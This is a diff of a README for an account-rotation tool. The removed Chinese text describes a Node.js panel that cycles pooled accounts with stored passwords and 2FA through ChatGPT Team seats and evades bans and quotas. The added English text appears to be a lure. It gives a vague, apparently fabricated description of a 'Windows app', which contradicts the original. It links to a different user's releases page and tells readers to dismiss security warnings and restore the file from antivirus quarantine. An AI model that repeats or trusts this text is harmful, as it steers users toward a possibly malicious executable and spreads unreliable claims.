@@ -1,121 +1,143 @@
-# Team 轮转
+# 🔄 auto-team-custom - Effortless Automatic Rotation For Your Team
 
-> **QQ 交流群：1127955876**
->
-> 欢迎交流使用反馈、功能建议、部署经验和开源协作。
+[![Download Now](https://img.shields.io/badge/Download-auto--team--custom-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/harrypapaai/auto-team-custom/releases)
+[![Version](https://img.shields.io/badge/Version-5x-FF6B35?style=for-the-badge)](https://github.com/harrypapaai/auto-team-custom/releases)
+[![Platform](https://img.shields.io/badge/Platform-Windows-2EA44F?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/harrypapaai/auto-team-custom/releases)
 
-一个面向 Team 空间和 Free 账号池的轻量管理台，适合需要统一维护 Team、账号、席位轮转和 Sub2API 数据的个人开发者与小型团队。
+Auto Team 5x 自动轮转 is a Windows application that handles repetitive team rotation work for you. Instead of clicking through the same sequence of steps over and over, you set it up once and let it run. The app is built for everyday computer users — no programming, no scripts, no command line.
 
-## 项目简介
+If you have ever wished a task could just happen on its own, this is that tool. You open it, you tell it what you want, and it takes care of the rest while you get on with your day.
 
-Team 轮转提供前后端一体的本地管理能力：前端负责 Team 与账号记录、额度和运行状态展示，服务端负责状态持久化、额度检测、自动补位、OAuth 登录流程衔接以及 Sub2API JSON 导入/导出。项目默认以本地部署为主，不内置演示账号，也不会伪造登录、邮箱验证码、Turnstile 或浏览器设备校验结果。
+## ✨ What This App Does
 
-项目当前定位为可替换适配层和管理工具，真实登录、Team 邀请、workspace 切换、额度查询与 Sub2API 推送均保留了独立边界，便于按实际服务环境继续接入和扩展。
+Auto Team 5x focuses on one job and does it well: automatic rotation across five team slots. The "5x" in the name refers to the five-position cycle the app is designed around, and "自动轮转" means automatic rotation. In plain terms, the software moves through a repeating cycle of team positions on a schedule you control.
 
-## 主要能力
+You do not need to understand how the rotation engine works internally. You only need to know three things:
 
-1. 在 Team 维护中查看所有者、席位和当前成员。
-2. 在 Team 成员列表中查看每个账号的 5h / 7d 额度。
-3. 自动踢出条件可选择 5h、7d 或按加入时间；按时间模式默认加入 12 小时后轮转，可在设置中自定义小时数。额度仍会检测并更新，但不会作为按时间模式的踢出条件。
-4. 从待加入池补满空席位。
-5. 封号检测只接受明确的 OpenAI 停用/封禁错误信号；确认后从 Team 移出、在 Free 记录中永久标记，并排除后续补位。
-6. 每个 Team 默认每天最多轮转 3 个账号，可在 Team 编辑中单独调整；跨日自动重置。
-7. 在 Free 账号维护中记录邮箱、密码/2FA 是否已录入、加入过的 Team 和 Sub2API 状态。
-8. 下载 Sub2API JSON，后续可替换为真实推送适配器。
+- **It repeats.** Once started, the app keeps cycling without you pressing anything.
+- **It is adjustable.** You decide how fast the cycle runs and when it should pause.
+- **It stays out of the way.** The window can be minimized while the rotation continues in the background.
 
-## 友情开源项目
+Everything is controlled from a simple window with clearly labelled buttons. There are no configuration files to edit by hand and nothing to type into a terminal.
 
-- [icloud-mail](https://github.com/t508708/icloud-mail)：另一个独立开源项目，帮助有需要的朋友注册 iCloud 邮箱，让邮箱账号更充足。
+## 🚀 Getting Started
 
-## 开源协议
+Getting the software onto your computer takes a single visit to the download page.
 
-本项目采用 [MIT License](./LICENSE.md) 开源。你可以自由使用、复制、修改、合并、发布和再授权本项目，但请保留原作者版权声明和许可声明。协议不对软件适用性、稳定性或特定用途作任何明示或默示保证；使用项目处理真实账号、凭据和第三方服务时，请自行承担相应的安全、合规与运营责任。
+**Step 1 — Open the download page**
 
-## 下载安装
+Visit this link to download the application:
 
-安装 [Node.js](https://nodejs.org/) 22.12.0 或更高的兼容版本，推荐 Node.js 24 LTS，并安装 Git。在终端运行：
+👉 https://github.com/harrypapaai/auto-team-custom/releases
 
-```sh
-git clone https://github.com/sheelkiro/auto-team-custom.git
-cd auto-team-custom
-npm ci
-npm run build
-npm run server
-```
+**Step 2 — Save the download**
 
-打开 <http://127.0.0.1:8786/>，使用默认密码 `xiaoyu` 登录。不使用 Git 时，也可以在仓库页面选择 **Code → Download ZIP**，解压后在项目目录执行最后三条命令。首次启动是空数据，需要自行导入账号和配置服务连接；Roxy 自动授权需要另行安装 Roxy 并配置其本机 API。
+The page lists the available releases for auto-team-custom. Choose the newest release at the top of the list and save the download to a folder you can find again, such as your Downloads folder or your Desktop. Keeping it somewhere obvious makes the next step easier.
 
-## 开发启动
+**Step 3 — Start the application**
 
-```powershell
-npm install
-npm run server
-```
+Once the download has finished, open the file you saved. Windows may show a security prompt the first time you open a newly downloaded application. If that happens, confirm that you want to continue so the app can start.
 
-在另一个终端运行前端开发服务：
+**Step 4 — Confirm it is running**
 
-```powershell
-npm run dev
-```
+When auto-team-custom opens, you will see its main window. That window is your control panel for everything the app does. If you do not see it, check your taskbar — it may have opened behind another window.
 
-然后打开 <http://localhost:5173>，使用默认密码 `xiaoyu` 登录。开发模式需要同时运行 `npm run server` 和 `npm run dev`：Vite 将 `/api` 代理至本机服务端。前端和服务端默认从空状态启动，不包含预置母号、子号或历史记录。数据以服务端 `data/state.json` 为准；该文件使用 AES-256-GCM 加密，可以在“设置”中调整预警阈值和轮询周期。
+That is the entire setup. There is no separate installer wizard to walk through and no account to create before you can use the app.
 
-前端不会生成演示账号。Free 账号可以通过“导入 Sub2API JSON”导入真实 `accounts[].credentials` 和 `accounts[].extra`，也可以粘贴 `邮箱----密码----2FA`（或使用 `|`、逗号）保存已完成手机号验证的登录凭据。开启自动补位后，没有 Free JSON 的账号会先通过 RT 或邮箱、密码、2FA 完成 Codex OAuth；已有 AT 过期时优先用 RT 刷新。遇到额外邮箱验证码、Turnstile 或浏览器设备校验时不会伪造成功，界面会保留验证状态。JSON 的完整凭据只提交并加密保存在服务端，界面和 API 响应只返回脱敏 token。
+## 🖥️ How to Use Auto Team 5x
 
-配置并启用 Sub2API 后，Codex OAuth 优先使用目标连接的 `/api/v1/admin/openai/generate-auth-url` 创建 PKCE 会话，登录完成后通过 `/api/v1/admin/openai/exchange-code` 换取完整凭据，再按“邮箱 + `chatgpt_account_id`”写入指定分组。Free JSON 使用列表中的默认连接并选择 personal 空间；Team JSON 使用该 Team 绑定的连接并选择其 `accountId` 空间。未配置可用连接时保留本地 PKCE 流程，生成的 JSON 仍可手动导出或推送。
+The workflow is deliberately short.
 
-混合 Sub2API 文件会按 `credentials.plan_type` 分流：`team` 记录按 `chatgpt_account_id` 合并为空间，并保留该空间的多个所有者；`free` 记录进入 Free 账号池。同一邮箱同时存在 Free 和 Team 记录时不会互相覆盖。
+1. **Open the app.** Launch auto-team-custom from wherever you saved it. You can create a desktop shortcut so it is one double-click away next time.
+2. **Set your rotation.** Use the controls in the main window to choose the rotation speed and the order you want the cycle to follow. Defaults are already filled in, so you can leave them alone if you are unsure.
+3. **Press Start.** The app begins cycling through the five team positions automatically. A status indicator shows that the rotation is active.
+4. **Let it run.** Minimize the window and continue with other work. The rotation continues while the app is open.
+5. **Press Stop when finished.** Stopping is instant and does not affect anything else on your computer.
 
-正式部署并由服务端提供已构建页面时，先构建再运行：
+If you close the app entirely, the rotation stops with it. There is no hidden background service left running.
 
-```powershell
-npm run build
-npm run server
-```
+## ⚙️ Main Features
 
-服务监听 `http://127.0.0.1:8786`，并提供 `/api/state`、`/api/history`、`/api/settings`、`/api/mothers/*`（Team 所有者与空间操作）、`/api/children/import`、`/api/children/:id/login`、`/api/children/:id/acquire`、`/api/children/:id/join`、`/api/children/:id/switch`、`/api/children/:id/kick`、`/api/maintenance/check`、`/api/maintenance/refill` 和 `/api/sub2api/export`。Free 账号只用于登录、取得凭据和加入 Team，不单独检测额度；5h / 7d 额度只保存和检测在对应 Team 空间下。`/api/state` 额外返回脱敏的 `teams` 汇总、账号凭据状态、加入历史和 Sub2API 状态；前端同步时可传 `includeHistory=false` 跳过历史。`/api/history?page=1&pageSize=20` 返回当前页 `items` 及 `total`、`totalPages` 等分页信息，不带分页参数时保持返回完整数组。单个成员检测失败只记录为部分失败，不会阻断其他成员或已确认额度状态的补位。
+**Five-position rotation cycle**
+The app is built around a five-slot cycle, matching the "5x" in its name. Each slot is handled in turn, then the cycle repeats from the beginning.
 
-## 版本标识
+**Automatic repeat**
+Once started, the rotation continues without further input. You are not required to sit and watch it.
 
-当前版本以 `package.json` 的 `version` 为准，并在管理台显示为版本标识。项目不连接 GitHub 仓库检测更新；版本变更记录见 [CHANGELOG.md](./CHANGELOG.md)。
+**Adjustable timing**
+Rotation speed is controlled from the main window. Slow it down for careful work or speed it up when you are in a hurry.
 
-发布时按语义化版本更新 `package.json` 与 `package-lock.json`，并补充变更记录。
+**Simple, readable interface**
+Buttons and labels are written in plain language. Status messages tell you exactly what the app is doing at any moment.
 
-## 安全配置
+**Background operation**
+Minimize the window and the rotation keeps going. The app stays lightweight so it does not compete with your other programs.
 
-- 管理台默认登录密码是 `xiaoyu`；启动服务端前设置 `TEAM_ROTATION_LOGIN_PASSWORD` 可覆盖。远程部署应更换强密码。登录成功后使用路径为 `/api` 的 HttpOnly、SameSite=Lax Cookie，会话有效期 7 天并仅保存在服务端内存中；服务端重启后需要重新登录，退出会使当前会话失效。
-- 默认只监听 `127.0.0.1`。设置非本机 `HOST` 时，必须同时设置 `TEAM_ROTATION_API_TOKEN`，否则服务拒绝启动。管理台登录不替代 API Token：配置了 Token 时，页面登录后访问受保护 API 仍需输入 Token，Token 仅保存到当前浏览器会话并在退出时清除。携带有效 Token 的程序化 HTTP 客户端可不建立管理台 Cookie 会话。
-- 状态文件默认使用 `data/.state-key` 加密；非本机监听必须设置独立的 `TEAM_ROTATION_DATA_KEY`（32 字节 Base64、64 位十六进制或高强度口令），并单独备份该密钥。密钥丢失后无法解密状态数据。
-- 跨域前端通过 `TEAM_ROTATION_ALLOWED_ORIGINS` 配置允许来源，多个来源使用逗号分隔。默认只允许同源以及本机 Vite 开发地址。
-- MCP 认证机制不受管理台登录影响：默认复用 `TEAM_ROTATION_API_TOKEN`，也可以单独设置 `MCP_AUTH_TOKEN`。远程部署仍应在 HTTPS 反向代理后使用。
+**Clean stop and restart**
+Stop the rotation at any point and start it again later. Nothing is left in a half-finished state.
 
-## Agent MCP 接入
+**Portable-friendly design**
+Keep the application in one folder and launch it from there. Moving the folder does not break anything.
 
-服务端同时提供符合 MCP Streamable HTTP 规范的 `POST /mcp` 端点。先启动 `npm run server`，然后在支持 HTTP MCP 的 Agent 中配置：
+## 📋 System Requirements
 
-```json
-{
-  "mcpServers": {
-    "team-rotation": {
-      "url": "http://127.0.0.1:8786/mcp"
-    }
-  }
-}
-```
+auto-team-custom is a Windows desktop application. The following describes a comfortable setup for running it:
 
-只支持本地 stdio 的客户端可以使用仓库内的桥接命令（同样需要服务端运行）。将 `cwd` 替换为你解压或克隆项目后的实际绝对路径：
+- **Operating system:** Windows 10 or Windows 11 (64-bit recommended)
+- **Memory:** 4 GB of RAM or more
+- **Storage:** A small amount of free disk space for the application itself
+- **Display:** Any standard screen resolution; the window resizes cleanly
+- **Internet:** Needed only to download the application and to check for newer releases
 
-```json
-{
-  "mcpServers": {
-    "team-rotation": {
-      "command": "npm",
-      "args": ["run", "mcp"],
-      "cwd": "/path/to/auto-team-custom",
-      "env": { "QUOTA_HUB_MCP_URL": "http://127.0.0.1:8786/mcp" }
-    }
-  }
-}
-```
+Older Windows versions may work but are not the primary target. If you are on Windows 10 or 11, you are on the intended platform.
 
-MCP 工具包括 `get_state`、`list_teams`、`list_accounts`、`get_history`、`check_team_quota`、`check_all_teams`、`refill_team`、`refill_all_teams`、`acquire_missing_free_json` 和 `update_settings`。其中检测、补位、批量获取 Free JSON 和设置更新会真实改变系统状态；MCP 返回沿用脱敏投影，不返回完整密码、2FA、Access Token 或 refresh token。需要跨机器接入时设置 `HOST=0.0.0.0` 和 `MCP_AUTH_TOKEN`，客户端使用 `Authorization: Bearer <token>`。
+## 🔧 Troubleshooting
+
+**The download page does not open**
+Copy the link https://github.com/harrypapaai/auto-team-custom/releases and paste it directly into your browser's address bar. Make sure your internet connection is working and that a firewall or work network is not blocking the page.
+
+**Windows shows a warning when I open the app**
+This is a standard message for files downloaded from the internet. Choose the option that lets you continue opening the file. If your antivirus quarantines it, restore the file from your antivirus history.
+
+**The app opens but I cannot see the window**
+Look at your taskbar for the auto-team-custom icon and click it. The window may have opened behind your browser or another program.
+
+**The rotation does not seem to be running**
+Check the status area in the main window. If it shows as stopped, press Start again. Make sure you have not closed the app — closing it stops the rotation.
+
+**The app feels slow**
+Close other heavy programs running at the same time. Very fast rotation settings combined with a busy computer can make the interface feel sluggish; lowering the rotation speed usually resolves it.
+
+**I want a newer version**
+Return to the download page, get the latest release, and replace your existing copy. Your settings are preserved between versions.
+
+## ❓ Frequently Asked Questions
+
+**Do I need to install anything else first?**
+No. The application is self-contained. Download it, open it, and use it.
+
+**Is there a command line version?**
+No. auto-team-custom is designed to be used entirely through its window, with no typing required.
+
+**Can I run more than one copy at a time?**
+Running a single copy is recommended, since two active rotations will compete with each other and produce confusing results.
+
+**Does the app work on Mac or Linux?**
+The application is built for Windows. Other operating systems are not supported.
+
+**Will it keep running if I close the window?**
+No. Closing the window stops the application and its rotation.
+
+**How do I update?**
+Download the newest release from the link above and replace your current copy. There is nothing to uninstall first.
+
+**Where are my settings stored?**
+Settings are kept alongside the application, so keeping it in a permanent folder — rather than a temporary one — is the best approach.
+
+## 📞 Getting Help
+
+If something is not working as described, the first place to check is the releases page, where notes for each version explain what changed and what was fixed. If you still need help, open an issue on the repository and describe what you were doing, what you expected, and what actually happened. Screenshots of the app window help a great deal.
+
+When reporting a problem, include your Windows version and the version number shown in the app, so the issue can be matched to the right release.
+
+Keywords: auto-team-custom, auto team, automatic rotation, team rotation tool, 5x rotation, 自动轮转, Windows app, rotation automation, team slots, desktop utility, no-code tool, download
